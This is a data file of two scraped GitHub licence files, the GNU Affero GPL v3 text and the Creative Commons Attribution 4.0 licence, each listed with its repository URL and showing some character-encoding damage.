0,https://github.com/vulcoo/gunbot1.git,"                     GNU AFFERO GENERAL PUBLIC LICENSE                        Version 3, 19 November 2007   Copyright (C) 2007 Free Software Foundation, Inc. <http://fsf.org/>  Everyone is permitted to copy and distribute verbatim copies  of this license document, but changing it is not allowed.                              Preamble    The GNU Affero General Public License is a free, copyleft license for software and other kinds of works, specifically designed to ensure cooperation with the community in the case of network server software.    The licenses for most software and other practical works are designed to take away your freedom to share and change the works.  By contrast, our General Public Licenses are intended to guarantee your freedom to share and change all versions of a program--to make sure it remains free software for all its users.    When we speak of free software, we are referring to freedom, not price.  Our General Public Licenses are designed to make sure that you have the freedom to distribute copies of free software (and charge for them if you wish), that you receive source code or can get it if you want it, that you can change the software or use pieces of it in new free programs, and that you know you can do these things.    Developers that use our General Public Licenses protect your rights with two steps: (1) assert copyright on the software, and (2) offer you this License which gives you legal permission to copy, distribute and/or modify the software.    A secondary benefit of defending all users\' freedom is that improvements made in alternate versions of the program, if they receive widespread use, become available for other developers to incorporate.  Many developers of free software are heartened and encouraged by the resulting cooperation.  However, in the case of software used on network servers, this result may fail to come about. The GNU General Public License permits making a modified version and letting the public access it on a server without ever releasing its source code to the public.    The GNU Affero General Public License is designed specifically to ensure that, in such cases, the modified source code becomes available to the community.  It requires the operator of a network server to provide the source code of the modified version running there to the users of that server.  Therefore, public use of a modified version, on a publicly accessible server, gives the public access to the source code of the modified version.    An older license, called the Affero General Public License and published by Affero, was designed to accomplish similar goals.  This is a different license, not a version of the Affero GPL, but Affero has released a new version of the Affero GPL which permits relicensing under this license.    The precise terms and conditions for copying, distribution and modification follow.                         TERMS AND CONDITIONS    0. Definitions.    ""This License"" refers to version 3 of the GNU Affero General Public License.    ""Copyright"" also means copyright-like laws that apply to other kinds of works, such as semiconductor masks.    ""The Program"" refers to any copyrightable work licensed under this License.  Each licensee is addressed as ""you"".  ""Licensees"" and ""recipients"" may be individuals or organizations.    To ""modify"" a work means to copy from or adapt all or part of the work in a fashion requiring copyright permission, other than the making of an exact copy.  The resulting work is called a ""modified version"" of the earlier work or a work ""based on"" the earlier work.    A ""covered work"" means either the unmodified Program or a work based on the Program.    To ""propagate"" a work means to do anything with it that, without permission, would make you directly or secondarily liable for infringement under applicable copyright law, except executing it on a computer or modifying a private copy.  Propagation includes copying, distribution (with or without modification), making available to the public, and in some countries other activities as well.    To ""convey"" a work means any kind of propagation that enables other parties to make or receive copies.  Mere interaction with a user through a computer network, with no transfer of a copy, is not conveying.    An interactive user interface displays ""Appropriate Legal Notices"" to the extent that it includes a convenient and prominently visible feature that (1) displays an appropriate copyright notice, and (2) tells the user that there is no warranty for the work (except to the extent that warranties are provided), that licensees may convey the work under this License, and how to view a copy of this License.  If the interface presents a list of user commands or options, such as a menu, a prominent item in the list meets this criterion.    1. Source Code.    The ""source code"" for a work means the preferred form of the work for making modifications to it.  ""Object code"" means any non-source form of a work.    A ""Standard Interface"" means an interface that either is an official standard defined by a recognized standards body, or, in the case of interfaces specified for a particular programming language, one that is widely used among developers working in that language.    The ""System Libraries"" of an executable work include anything, other than the work as a whole, that (a) is included in the normal form of packaging a Major Component, but which is not part of that Major Component, and (b) serves only to enable use of the work with that Major Component, or to implement a Standard Interface for which an implementation is available to the public in source code form.  A ""Major Component"", in this context, means a major essential component (kernel, window system, and so on) of the specific operating system (if any) on which the executable work runs, or a compiler used to produce the work, or an object code interpreter used to run it.    The ""Corresponding Source"" for a work in object code form means all the source code needed to generate, install, and (for an executable work) run the object code and to modify the work, including scripts to control those activities.  However, it does not include the work\'s System Libraries, or general-purpose tools or generally available free programs which are used unmodified in performing those activities but which are not part of the work.  For example, Corresponding Source includes interface definition files associated with source files for the work, and the source code for shared libraries and dynamically linked subprograms that the work is specifically designed to require, such as by intimate data communication or control flow between those subprograms and other parts of the work.    The Corresponding Source need not include anything that users can regenerate automatically from other parts of the Corresponding Source.    The Corresponding Source for a work in source code form is that same work.    2. Basic Permissions.    All rights granted under this License are granted for the term of copyright on the Program, and are irrevocable provided the stated conditions are met.  This License explicitly affirms your unlimited permission to run the unmodified Program.  The output from running a covered work is covered by this License only if the output, given its content, constitutes a covered work.  This License acknowledges your rights of fair use or other equivalent, as provided by copyright law.    You may make, run and propagate covered works that you do not convey, without conditions so long as your license otherwise remains in force.  You may convey covered works to others for the sole purpose of having them make modifications exclusively for you, or provide you with facilities for running those works, provided that you comply with the terms of this License in conveying all material for which you do not control copyright.  Those thus making or running the covered works for you must do so exclusively on your behalf, under your direction and control, on terms that prohibit them from making any copies of your copyrighted material outside their relationship with you.    Conveying under any other circumstances is permitted solely under the conditions stated below.  Sublicensing is not allowed; section 10 makes it unnecessary.    3. Protecting Users\' Legal Rights From Anti-Circumvention Law.    No covered work shall be deemed part of an effective technological measure under any applicable law fulfilling obligations under article 11 of the WIPO copyright treaty adopted on 20 December 1996, or similar laws prohibiting or restricting circumvention of such measures.    When you convey a covered work, you waive any legal power to forbid circumvention of technological measures to the extent such circumvention is effected by exercising rights under this License with respect to the covered work, and you disclaim any intention to limit operation or modification of the work as a means of enforcing, against the work\'s users, your or third parties\' legal rights to forbid circumvention of technological measures.    4. Conveying Verbatim Copies.    You may convey verbatim copies of the Program\'s source code as you receive it, in any medium, provided that you conspicuously and appropriately publish on each copy an appropriate copyright notice; keep intact all notices stating that this License and any non-permissive terms added in accord with section 7 apply to the code; keep intact all notices of the absence of any warranty; and give all recipients a copy of this License along with the Program.    You may charge any price or no price for each copy that you convey, and you may offer support or warranty protection for a fee.    5. Conveying Modified Source Versions.    You may convey a work based on the Program, or the modifications to produce it from the Program, in the form of source code under the terms of section 4, provided that you also meet all of these conditions:      a) The work must carry prominent notices stating that you modified     it, and giving a relevant date.      b) The work must carry prominent notices stating that it is     released under this License and any conditions added under section     7.  This requirement modifies the requirement in section 4 to     ""keep intact all notices"".      c) You must license the entire work, as a whole, under this     License to anyone who comes into possession of a copy.  This     License will therefore apply, along with any applicable section 7     additional terms, to the whole of the work, and all its parts,     regardless of how they are packaged.  This License gives no     permission to license the work in any other way, but it does not     invalidate such permission if you have separately received it.      d) If the work has interactive user interfaces, each must display     Appropriate Legal Notices; however, if the Program has interactive     interfaces that do not display Appropriate Legal Notices, your     work need not make them do so.    A compilation of a covered work with other separate and independent works, which are not by their nature extensions of the covered work, and which are not combined with it such as to form a larger program, in or on a volume of a storage or distribution medium, is called an ""aggregate"" if the compilation and its resulting copyright are not used to limit the access or legal rights of the compilation\'s users beyond what the individual works permit.  Inclusion of a covered work in an aggregate does not cause this License to apply to the other parts of the aggregate.    6. Conveying Non-Source Forms.    You may convey a covered work in object code form under the terms of sections 4 and 5, provided that you also convey the machine-readable Corresponding Source under the terms of this License, in one of these ways:      a) Convey the object code in, or embodied in, a physical product     (including a physical distribution medium), accompanied by the     Corresponding Source fixed on a durable physical medium     customarily used for software interchange.      b) Convey the object code in, or embodied in, a physical product     (including a physical distribution medium), accompanied by a     written offer, valid for at least three years and valid for as     long as you offer spare parts or customer support for that product     model, to give anyone who possesses the object code either (1) a     copy of the Corresponding Source for all the software in the     product that is covered by this License, on a durable physical     medium customarily used for software interchange, for a price no     more than your reasonable cost of physically performing this     conveying of source, or (2) access to copy the     Corresponding Source from a network server at no charge.      c) Convey individual copies of the object code with a copy of the     written offer to provide the Corresponding Source.  This     alternative is allowed only occasionally and noncommercially, and     only if you received the object code with such an offer, in accord     with subsection 6b.      d) Convey the object code by offering access from a designated     place (gratis or for a charge), and offer equivalent access to the     Corresponding Source in the same way through the same place at no     further charge.  You need not require recipients to copy the     Corresponding Source along with the object code.  If the place to     copy the object code is a network server, the Corresponding Source     may be on a different server (operated by you or a third party)     that supports equivalent copying facilities, provided you maintain     clear directions next to the object code saying where to find the     Corresponding Source.  Regardless of what server hosts the     Corresponding Source, you remain obligated to ensure that it is     available for as long as needed to satisfy these requirements.      e) Convey the object code using peer-to-peer transmission, provided     you inform other peers where the object code and Corresponding     Source of the work are being offered to the general public at no     charge under subsection 6d.    A separable portion of the object code, whose source code is excluded from the Corresponding Source as a System Library, need not be included in conveying the object code work.    A ""User Product"" is either (1) a ""consumer product"", which means any tangible personal property which is normally used for personal, family, or household purposes, or (2) anything designed or sold for incorporation into a dwelling.  In determining whether a product is a consumer product, doubtful cases shall be resolved in favor of coverage.  For a particular product received by a particular user, ""normally used"" refers to a typical or common use of that class of product, regardless of the status of the particular user or of the way in which the particular user actually uses, or expects or is expected to use, the product.  A product is a consumer product regardless of whether the product has substantial commercial, industrial or non-consumer uses, unless such uses represent the only significant mode of use of the product.    ""Installation Information"" for a User Product means any methods, procedures, authorization keys, or other information required to install and execute modified versions of a covered work in that User Product from a modified version of its Corresponding Source.  The information must suffice to ensure that the continued functioning of the modified object code is in no case prevented or interfered with solely because modification has been made.    If you convey an object code work under this section in, or with, or specifically for use in, a User Product, and the conveying occurs as part of a transaction in which the right of possession and use of the User Product is transferred to the recipient in perpetuity or for a fixed term (regardless of how the transaction is characterized), the Corresponding Source conveyed under this section must be accompanied by the Installation Information.  But this requirement does not apply if neither you nor any third party retains the ability to install modified object code on the User Product (for example, the work has been installed in ROM).    The requirement to provide Installation Information does not include a requirement to continue to provide support service, warranty, or updates for a work that has been modified or installed by the recipient, or for the User Product in which it has been modified or installed.  Access to a network may be denied when the modification itself materially and adversely affects the operation of the network or violates the rules and protocols for communication across the network.    Corresponding Source conveyed, and Installation Information provided, in accord with this section must be in a format that is publicly documented (and with an implementation available to the public in source code form), and must require no special password or key for unpacking, reading or copying.    7. Additional Terms.    ""Additional permissions"" are terms that supplement the terms of this License by making exceptions from one or more of its conditions. Additional permissions that are applicable to the entire Program shall be treated as though they were included in this License, to the extent that they are valid under applicable law.  If additional permissions apply only to part of the Program, that part may be used separately under those permissions, but the entire Program remains governed by this License without regard to the additional permissions.    When you convey a copy of a covered work, you may at your option remove any additional permissions from that copy, or from any part of it.  (Additional permissions may be written to require their own removal in certain cases when you modify the work.)  You may place additional permissions on material, added by you to a covered work, for which you have or can give appropriate copyright permission.    Notwithstanding any other provision of this License, for material you add to a covered work, you may (if authorized by the copyright holders of that material) supplement the terms of this License with terms:      a) Disclaiming warranty or limiting liability differently from the     terms of sections 15 and 16 of this License; or      b) Requiring preservation of specified reasonable legal notices or     author attributions in that material or in the Appropriate Legal     Notices displayed by works containing it; or      c) Prohibiting misrepresentation of the origin of that material, or     requiring that modified versions of such material be marked in     reasonable ways as different from the original version; or      d) Limiting the use for publicity purposes of names of licensors or     authors of the material; or      e) Declining to grant rights under trademark law for use of some     trade names, trademarks, or service marks; or      f) Requiring indemnification of licensors and authors of that     material by anyone who conveys the material (or modified versions of     it) with contractual assumptions of liability to the recipient, for     any liability that these contractual assumptions directly impose on     those licensors and authors.    All other non-permissive additional terms are considered ""further restrictions"" within the meaning of section 10.  If the Program as you received it, or any part of it, contains a notice stating that it is governed by this License along with a term that is a further restriction, you may remove that term.  If a license document contains a further restriction but permits relicensing or conveying under this License, you may add to a covered work material governed by the terms of that license document, provided that the further restriction does not survive such relicensing or conveying.    If you add terms to a covered work in accord with this section, you must place, in the relevant source files, a statement of the additional terms that apply to those files, or a notice indicating where to find the applicable terms.    Additional terms, permissive or non-permissive, may be stated in the form of a separately written license, or stated as exceptions; the above requirements apply either way.    8. Termination.    You may not propagate or modify a covered work except as expressly provided under this License.  Any attempt otherwise to propagate or modify it is void, and will automatically terminate your rights under this License (including any patent licenses granted under the third paragraph of section 11).    However, if you cease all violation of this License, then your license from a particular copyright holder is reinstated (a) provisionally, unless and until the copyright holder explicitly and finally terminates your license, and (b) permanently, if the copyright holder fails to notify you of the violation by some reasonable means prior to 60 days after the cessation.    Moreover, your license from a particular copyright holder is reinstated permanently if the copyright holder notifies you of the violation by some reasonable means, this is the first time you have received notice of violation of this License (for any work) from that copyright holder, and you cure the violation prior to 30 days after your receipt of the notice.    Termination of your rights under this section does not terminate the licenses of parties who have received copies or rights from you under this License.  If your rights have been terminated and not permanently reinstated, you do not qualify to receive new licenses for the same material under section 10.    9. Acceptance Not Required for Having Copies.    You are not required to accept this License in order to receive or run a copy of the Program.  Ancillary propagation of a covered work occurring solely as a consequence of using peer-to-peer transmission to receive a copy likewise does not require acceptance.  However, nothing other than this License grants you permission to propagate or modify any covered work.  These actions infringe copyright if you do not accept this License.  Therefore, by modifying or propagating a covered work, you indicate your acceptance of this License to do so.    10. Automatic Licensing of Downstream Recipients.    Each time you convey a covered work, the recipient automatically receives a license from the original licensors, to run, modify and propagate that work, subject to this License.  You are not responsible for enforcing compliance by third parties with this License.    An ""entity transaction"" is a transaction transferring control of an organization, or substantially all assets of one, or subdividing an organization, or merging organizations.  If propagation of a covered work results from an entity transaction, each party to that transaction who receives a copy of the work also receives whatever licenses to the work the party\'s predecessor in interest had or could give under the previous paragraph, plus a right to possession of the Corresponding Source of the work from the predecessor in interest, if the predecessor has it or can get it with reasonable efforts.    You may not impose any further restrictions on the exercise of the rights granted or affirmed under this License.  For example, you may not impose a license fee, royalty, or other charge for exercise of rights granted under this License, and you may not initiate litigation (including a cross-claim or counterclaim in a lawsuit) alleging that any patent claim is infringed by making, using, selling, offering for sale, or importing the Program or any portion of it.    11. Patents.    A ""contributor"" is a copyright holder who authorizes use under this License of the Program or a work on which the Program is based.  The work thus licensed is called the contributor\'s ""contributor version"".    A contributor\'s ""essential patent claims"" are all patent claims owned or controlled by the contributor, whether already acquired or hereafter acquired, that would be infringed by some manner, permitted by this License, of making, using, or selling its contributor version, but do not include claims that would be infringed only as a consequence of further modification of the contributor version.  For purposes of this definition, ""control"" includes the right to grant patent sublicenses in a manner consistent with the requirements of this License.    Each contributor grants you a non-exclusive, worldwide, royalty-free patent license under the contributor\'s essential patent claims, to make, use, sell, offer for sale, import and otherwise run, modify and propagate the contents of its contributor version.    In the following three paragraphs, a ""patent license"" is any express agreement or commitment, however denominated, not to enforce a patent (such as an express permission to practice a patent or covenant not to sue for patent infringement).  To ""grant"" such a patent license to a party means to make such an agreement or commitment not to enforce a patent against the party.    If you convey a covered work, knowingly relying on a patent license, and the Corresponding Source of the work is not available for anyone to copy, free of charge and under the terms of this License, through a publicly available network server or other readily accessible means, then you must either (1) cause the Corresponding Source to be so available, or (2) arrange to deprive yourself of the benefit of the patent license for this particular work, or (3) arrange, in a manner consistent with the requirements of this License, to extend the patent license to downstream recipients.  ""Knowingly relying"" means you have actual knowledge that, but for the patent license, your conveying the covered work in a country, or your recipient\'s use of the covered work in a country, would infringe one or more identifiable patents in that country that you have reason to believe are valid.    If, pursuant to or in connection with a single transaction or arrangement, you convey, or propagate by procuring conveyance of, a covered work, and grant a patent license to some of the parties receiving the covered work authorizing them to use, propagate, modify or convey a specific copy of the covered work, then the patent license you grant is automatically extended to all recipients of the covered work and works based on it.    A patent license is ""discriminatory"" if it does not include within the scope of its coverage, prohibits the exercise of, or is conditioned on the non-exercise of one or more of the rights that are specifically granted under this License.  You may not convey a covered work if you are a party to an arrangement with a third party that is in the business of distributing software, under which you make payment to the third party based on the extent of your activity of conveying the work, and under which the third party grants, to any of the parties who would receive the covered work from you, a discriminatory patent license (a) in connection with copies of the covered work conveyed by you (or copies made from those copies), or (b) primarily for and in connection with specific products or compilations that contain the covered work, unless you entered into that arrangement, or that patent license was granted, prior to 28 March 2007.    Nothing in this License shall be construed as excluding or limiting any implied license or other defenses to infringement that may otherwise be available to you under applicable patent law.    12. No Surrender of Others\' Freedom.    If conditions are imposed on you (whether by court order, agreement or otherwise) that contradict the conditions of this License, they do not excuse you from the conditions of this License.  If you cannot convey a covered work so as to satisfy simultaneously your obligations under this License and any other pertinent obligations, then as a consequence you may not convey it at all.  For example, if you agree to terms that obligate you to collect a royalty for further conveying from those to whom you convey the Program, the only way you could satisfy both those terms and this License would be to refrain entirely from conveying the Program.    13. Remote Network Interaction; Use with the GNU General Public License.    Notwithstanding any other provision of this License, if you modify the Program, your modified version must prominently offer all users interacting with it remotely through a computer network (if your version supports such interaction) an opportunity to receive the Corresponding Source of your version by providing access to the Corresponding Source from a network server at no charge, through some standard or customary means of facilitating copying of software.  This Corresponding Source shall include the Corresponding Source for any work covered by version 3 of the GNU General Public License that is incorporated pursuant to the following paragraph.    Notwithstanding any other provision of this License, you have permission to link or combine any covered work with a work licensed under version 3 of the GNU General Public License into a single combined work, and to convey the resulting work.  The terms of this License will continue to apply to the part which is the covered work, but the work with which it is combined will remain governed by version 3 of the GNU General Public License.    14. Revised Versions of this License.    The Free Software Foundation may publish revised and/or new versions of the GNU Affero General Public License from time to time.  Such new versions will be similar in spirit to the present version, but may differ in detail to address new problems or concerns.    Each version is given a distinguishing version number.  If the Program specifies that a certain numbered version of the GNU Affero General Public License ""or any later version"" applies to it, you have the option of following the terms and conditions either of that numbered version or of any later version published by the Free Software Foundation.  If the Program does not specify a version number of the GNU Affero General Public License, you may choose any version ever published by the Free Software Foundation.    If the Program specifies that a proxy can decide which future versions of the GNU Affero General Public License can be used, that proxy\'s public statement of acceptance of a version permanently authorizes you to choose that version for the Program.    Later license versions may give you additional or different permissions.  However, no additional obligations are imposed on any author or copyright holder as a result of your choosing to follow a later version.    15. Disclaimer of Warranty.    THERE IS NO WARRANTY FOR THE PROGRAM, TO THE EXTENT PERMITTED BY APPLICABLE LAW.  EXCEPT WHEN OTHERWISE STATED IN WRITING THE COPYRIGHT HOLDERS AND/OR OTHER PARTIES PROVIDE THE PROGRAM ""AS IS"" WITHOUT WARRANTY OF ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE.  THE ENTIRE RISK AS TO THE QUALITY AND PERFORMANCE OF THE PROGRAM IS WITH YOU.  SHOULD THE PROGRAM PROVE DEFECTIVE, YOU ASSUME THE COST OF ALL NECESSARY SERVICING, REPAIR OR CORRECTION.    16. Limitation of Liability.    IN NO EVENT UNLESS REQUIRED BY APPLICABLE LAW OR AGREED TO IN WRITING WILL ANY COPYRIGHT HOLDER, OR ANY OTHER PARTY WHO MODIFIES AND/OR CONVEYS THE PROGRAM AS PERMITTED ABOVE, BE LIABLE TO YOU FOR DAMAGES, INCLUDING ANY GENERAL, SPECIAL, INCIDENTAL OR CONSEQUENTIAL DAMAGES ARISING OUT OF THE USE OR INABILITY TO USE THE PROGRAM (INCLUDING BUT NOT LIMITED TO LOSS OF DATA OR DATA BEING RENDERED INACCURATE OR LOSSES SUSTAINED BY YOU OR THIRD PARTIES OR A FAILURE OF THE PROGRAM TO OPERATE WITH ANY OTHER PROGRAMS), EVEN IF SUCH HOLDER OR OTHER PARTY HAS BEEN ADVISED OF THE POSSIBILITY OF SUCH DAMAGES.    17. Interpretation of Sections 15 and 16.    If the disclaimer of warranty and limitation of liability provided above cannot be given local legal effect according to their terms, reviewing courts shall apply local law that most closely approximates an absolute waiver of all civil liability in connection with the Program, unless a warranty or assumption of liability accompanies a copy of the Program in return for a fee.                       END OF TERMS AND CONDITIONS              How to Apply These Terms to Your New Programs    If you develop a new program, and you want it to be of the greatest possible use to the public, the best way to achieve this is to make it free software which everyone can redistribute and change under these terms.    To do so, attach the following notices to the program.  It is safest to attach them to the start of each source file to most effectively state the exclusion of warranty; and each file should have at least the ""copyright"" line and a pointer to where the full notice is found.      PM2 Process manager for Node.JS     Copyright (C) 2013-2016 Strzelewicz Alexandre      This program is free software: you can redistribute it and/or modify     it under the terms of the GNU Affero General Public License as published by     the Free Software Foundation, either version 3 of the License, or     (at your option) any later version.      This program is distributed in the hope that it will be useful,     but WITHOUT ANY WARRANTY; without even the implied warranty of     MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the     GNU Affero General Public License for more details.      You should have received a copy of the GNU Affero General Public License     along with this program.  If not, see <http://www.gnu.org/licenses/>.  Also add information on how to contact you by electronic and paper mail.    If your software can interact with users remotely through a computer network, you should also make sure that it provides a way for users to get its source.  For example, if your program is a web application, its interface could display a ""Source"" link that leads users to an archive of the code.  There are many ways you could offer source, and different solutions will be better for different programs; see section 13 for the specific requirements.    You should also get your employer (if you work as a programmer) or school, if any, to sign a ""copyright disclaimer"" for the program, if necessary. For more information on this, and how to apply and follow the GNU AGPL, see <http://www.gnu.org/licenses/>.   --- ALEXANDRE STRZELEWICZ",,1
0,https://github.com/Saturnre/scaling-succotash.git,"Creative Commons Corporation (‚ÄúCreative Commons‚Äù) is not a law firm and does not provide legal services or legal advice. Distribution of Creative Commons public licenses does not create a lawyer-client or other relationship. Creative Commons makes its licenses and related information available on an ‚Äúas-is‚Äù basis. Creative Commons gives no warranties regarding its licenses, any material licensed under their terms and conditions, or any related information. Creative Commons disclaims all liability for damages resulting from their use to the fullest extent possible.    Creative Commons Attribution 4.0 International Public License By exercising the Licensed Rights (defined below), You accept and agree to be bound by the terms and conditions of this Creative Commons Attribution 4.0 International Public License (""Public License""). To the extent this Public License may be interpreted as a contract, You are granted the Licensed Rights in consideration of Your acceptance of these terms and conditions, and the Licensor grants You such rights in consideration of benefits the Licensor receives from making the Licensed Material available under these terms and conditions.  Section 1 ‚Äì Definitions.  Adapted Material means material subject to Copyright and Similar Rights that is derived from or based upon the Licensed Material and in which the Licensed Material is translated, altered, arranged, transformed, or otherwise modified in a manner requiring permission under the Copyright and Similar Rights held by the Licensor. For purposes of this Public License, where the Licensed Material is a musical work, performance, or sound recording, Adapted Material is always produced where the Licensed Material is synched in timed relation with a moving image. Adapter\'s License means the license You apply to Your Copyright and Similar Rights in Your contributions to Adapted Material in accordance with the terms and conditions of this Public License. Copyright and Similar Rights means copyright and/or similar rights closely related to copyright including, without limitation, performance, broadcast, sound recording, and Sui Generis Database Rights, without regard to how the rights are labeled or categorized. For purposes of this Public License, the rights specified in Section 2(b)(1)-(2) are not Copyright and Similar Rights. Effective Technological Measures means those measures that, in the absence of proper authority, may not be circumvented under laws fulfilling obligations under Article 11 of the WIPO Copyright Treaty adopted on December 20, 1996, and/or similar international agreements. Exceptions and Limitations means fair use, fair dealing, and/or any other exception or limitation to Copyright and Similar Rights that applies to Your use of the Licensed Material. Licensed Material means the artistic or literary work, database, or other material to which the Licensor applied this Public License. Licensed Rights means the rights granted to You subject to the terms and conditions of this Public License, which are limited to all Copyright and Similar Rights that apply to Your use of the Licensed Material and that the Licensor has authority to license. Licensor means the individual(s) or entity(ies) granting rights under this Public License. Share means to provide material to the public by any means or process that requires permission under the Licensed Rights, such as reproduction, public display, public performance, distribution, dissemination, communication, or importation, and to make material available to the public including in ways that members of the public may access the material from a place and at a time individually chosen by them. Sui Generis Database Rights means rights other than copyright resulting from Directive 96/9/EC of the European Parliament and of the Council of 11 March 1996 on the legal protection of databases, as amended and/or succeeded, as well as other essentially equivalent rights anywhere in the world. You means the individual or entity exercising the Licensed Rights under this Public License. Your has a corresponding meaning. Section 2 ‚Äì Scope.  License grant. Subject to the terms and conditions of this Public License, the Licensor hereby grants You a worldwide, royalty-free, non-sublicensable, non-exclusive, irrevocable license to exercise the Licensed Rights in the Licensed Material to: reproduce and Share the Licensed Material, in whole or in part; and produce, reproduce, and Share Adapted Material. Exceptions and Limitations. For the avoidance of doubt, where Exceptions and Limitations apply to Your use, this Public License does not apply, and You do not need to comply with its terms and conditions. Term. The term of this Public License is specified in Section 6(a). Media and formats; technical modifications allowed. The Licensor authorizes You to exercise the Licensed Rights in all media and formats whether now known or hereafter created, and to make technical modifications necessary to do so. The Licensor waives and/or agrees not to assert any right or authority to forbid You from making technical modifications necessary to exercise the Licensed Rights, including technical modifications necessary to circumvent Effective Technological Measures. For purposes of this Public License, simply making modifications authorized by this Section 2(a)(4) never produces Adapted Material. Downstream recipients. Offer from the Licensor ‚Äì Licensed Material. Every recipient of the Licensed Material automatically receives an offer from the Licensor to exercise the Licensed Rights under the terms and conditions of this Public License. No downstream restrictions. You may not offer or impose any additional or different terms or conditions on, or apply any Effective Technological Measures to, the Licensed Material if doing so restricts exercise of the Licensed Rights by any recipient of the Licensed Material. No endorsement. Nothing in this Public License constitutes or may be construed as permission to assert or imply that You are, or that Your use of the Licensed Material is, connected with, or sponsored, endorsed, or granted official status by, the Licensor or others designated to receive attribution as provided in Section 3(a)(1)(A)(i). Other rights.  Moral rights, such as the right of integrity, are not licensed under this Public License, nor are publicity, privacy, and/or other similar personality rights; however, to the extent possible, the Licensor waives and/or agrees not to assert any such rights held by the Licensor to the limited extent necessary to allow You to exercise the Licensed Rights, but not otherwise. Patent and trademark rights are not licensed under this Public License. To the extent possible, the Licensor waives any right to collect royalties from You for the exercise of the Licensed Rights, whether directly or through a collecting society under any voluntary or waivable statutory or compulsory licensing scheme. In all other cases the Licensor expressly reserves any right to collect such royalties. Section 3 ‚Äì License Conditions.  Your exercise of the Licensed Rights is expressly made subject to the following conditions.  Attribution.  If You Share the Licensed Material (including in modified form), You must:  retain the following if it is supplied by the Licensor with the Licensed Material: identification of the creator(s) of the Licensed Material and any others designated to receive attribution, in any reasonable manner requested by the Licensor (including by pseudonym if designated); a copyright notice; a notice that refers to this Public License; a notice that refers to the disclaimer of warranties; a URI or hyperlink to the Licensed Material to the extent reasonably practicable; indicate if You modified the Licensed Material and retain an indication of any previous modifications; and indicate the Licensed Material is licensed under this Public License, and include the text of, or the URI or hyperlink to, this Public License. You may satisfy the conditions in Section 3(a)(1) in any reasonable manner based on the medium, means, and context in which You Share the Licensed Material. For example, it may be reasonable to satisfy the conditions by providing a URI or hyperlink to a resource that includes the required information. If requested by the Licensor, You must remove any of the information required by Section 3(a)(1)(A) to the extent reasonably practicable. If You Share Adapted Material You produce, the Adapter\'s License You apply must not prevent recipients of the Adapted Material from complying with this Public License. Section 4 ‚Äì Sui Generis Database Rights.  Where the Licensed Rights include Sui Generis Database Rights that apply to Your use of the Licensed Material:  for the avoidance of doubt, Section 2(a)(1) grants You the right to extract, reuse, reproduce, and Share all or a substantial portion of the contents of the database; if You include all or a substantial portion of the database contents in a database in which You have Sui Generis Database Rights, then the database in which You have Sui Generis Database Rights (but not its individual contents) is Adapted Material; and You must comply with the conditions in Section 3(a) if You Share all or a substantial portion of the contents of the database. For the avoidance of doubt, this Section 4 supplements and does not replace Your obligations under this Public License where the Licensed Rights include other Copyright and Similar Rights. Section 5 ‚Äì Disclaimer of Warranties and Limitation of Liability.  Unless otherwise separately undertaken by the Licensor, to the extent possible, the Licensor offers the Licensed Material as-is and as-available, and makes no representations or warranties of any kind concerning the Licensed Material, whether express, implied, statutory, or other. This includes, without limitation, warranties of title, merchantability, fitness for a particular purpose, non-infringement, absence of latent or other defects, accuracy, or the presence or absence of errors, whether or not known or discoverable. Where disclaimers of warranties are not allowed in full or in part, this disclaimer may not apply to You. To the extent possible, in no event will the Licensor be liable to You on any legal theory (including, without limitation, negligence) or otherwise for any direct, special, indirect, incidental, consequential, punitive, exemplary, or other losses, costs, expenses, or damages arising out of this Public License or use of the Licensed Material, even if the Licensor has been advised of the possibility of such losses, costs, expenses, or damages. Where a limitation of liability is not allowed in full or in part, this limitation may not apply to You. The disclaimer of warranties and limitation of liability provided above shall be interpreted in a manner that, to the extent possible, most closely approximates an absolute disclaimer and waiver of all liability. Section 6 ‚Äì Term and Termination.  This Public License applies for the term of the Copyright and Similar Rights licensed here. However, if You fail to comply with this Public License, then Your rights under this Public License terminate automatically. Where Your right to use the Licensed Material has terminated under Section 6(a), it reinstates:  automatically as of the date the violation is cured, provided it is cured within 30 days of Your discovery of the violation; or upon express reinstatement by the Licensor. For the avoidance of doubt, this Section 6(b) does not affect any right the Licensor may have to seek remedies for Your violations of this Public License. For the avoidance of doubt, the Licensor may also offer the Licensed Material under separate terms or conditions or stop distributing the Licensed Material at any time; however, doing so will not terminate this Public License. Sections 1, 5, 6, 7, and 8 survive termination of this Public License. Section 7 ‚Äì Other Terms and Conditions.  The Licensor shall not be bound by any additional or different terms or conditions communicated by You unless expressly agreed. Any arrangements, understandings, or agreements regarding the Licensed Material not stated herein are separate from and independent of the terms and conditions of this Public License. Section 8 ‚Äì Interpretation.  For the avoidance of doubt, this Public License does not, and shall not be interpreted to, reduce, limit, restrict, or impose conditions on any use of the Licensed Material that could lawfully be made without permission under this Public License. To the extent possible, if any provision of this Public License is deemed unenforceable, it shall be automatically reformed to the minimum extent necessary to make it enforceable. If the provision cannot be reformed, it shall be severed from this Public License without affecting the enforceability of the remaining terms and conditions. No term or condition of this Public License will be waived and no failure to comply consented to unless expressly agreed to by the Licensor. Nothing in this Public License constitutes or may be interpreted as a limitation upon, or waiver of, any privileges and immunities that apply to the Licensor or You, including from the legal processes of any jurisdiction or authority. Creative Commons is not a party to its public licenses. Notwithstanding, Creative Commons may elect to apply one of its public licenses to material it publishes and in those instances will be considered the ‚ÄúLicensor.‚Äù The text of the Creative Commons public licenses is dedicated to the public domain under the CC0 Public Domain Dedication. Except for the limited purpose of indicating that material is shared under a Creative Commons public license or as otherwise permitted by the Creative Commons policies published at creativecommons.org/policies, Creative Commons does not authorize the use of the trademark ‚ÄúCreative Commons‚Äù or any other trademark or logo of Creative Commons without its prior written consent including, without limitation, in connection with any unauthorized modifications to any of its public licenses or any other arrangements, understandings, or agreements concerning use of licensed material. For the avoidance of doubt, this paragraph does not form part of the public licenses.  Creative Commons may be contacted at creativecommons.org.  Additional languages available: Bahasa Indonesia, euskara, Deutsch, Espa√±ol, fran√ßais, hrvatski, italiano, latviski, Lietuvi≈≥, Nederlands, norsk, polski, portugu√™s, suomeksi, svenska, te reo MƒÅori, T√ºrk√ße, —Ä—É—Å—Å–∫–∏–π, —É–∫—Ä–∞—ó–Ω—Å—å–∫–∞, ÿßŸÑÿπÿ±ÿ®Ÿäÿ©, Êó•Êú¨Ë™û. Please read the FAQ for more information about official translations.      Except where otherwise noted, content on this site is licensed under a Creative Commons Attribution 4.0 International license.    PSPP 